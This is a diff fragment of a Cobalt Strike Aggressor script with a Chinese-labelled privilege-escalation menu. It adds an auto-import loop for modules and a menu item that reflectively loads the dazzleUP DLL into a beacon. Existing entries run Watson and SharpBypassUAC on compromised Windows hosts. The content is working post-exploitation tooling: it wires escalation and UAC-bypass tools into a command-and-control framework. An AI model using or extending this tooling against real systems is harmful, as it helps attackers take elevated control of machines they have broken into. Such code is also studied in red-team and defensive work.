@@ -8,13 +8,23 @@
 #                            #
 ##############################
 	menu "权限提升" {
-		  item "Watson" {
+@aggressor =  ls(script_resource("/modules/aggressor"));
+println("[+] Importing:");
+foreach $file (@aggressor){ 
+	include($file);
+	println("   $file");
+}
+
+		item "Watson" {
 			$bid = $1;
 			$dialog = dialog("Watson", %(bid => $bid), &Watson);
 			dialog_description($dialog, "获取可用于提权的漏洞。支持Windows 10 1507、1511、1607、1703、1709、1803、1809、windows server 2016和2019。");
             dbutton_action($dialog, "运行");
 			dialog_show($dialog);
         }
+		item "dazzleUP" {
+			bdllspawn($1, script_resource("/script/dazzleUP_Reflective_DLL.x64.dll"), $2, "dazzleUP", 5000, false);
+		}
 sub Watson {
 	bexecute_assembly($bid, script_resource("/script/Watson.exe"), "");
 }
@@ -237,6 +247,7 @@ sub BypassUAC {
 	$arg = join(' ', @("-b",$3['type'],"-e",$3['cmd']));
 	bexecute_assembly($bid, script_resource("/script/SharpBypassUAC.exe"), $arg);
 }
+
 	}
 
 	
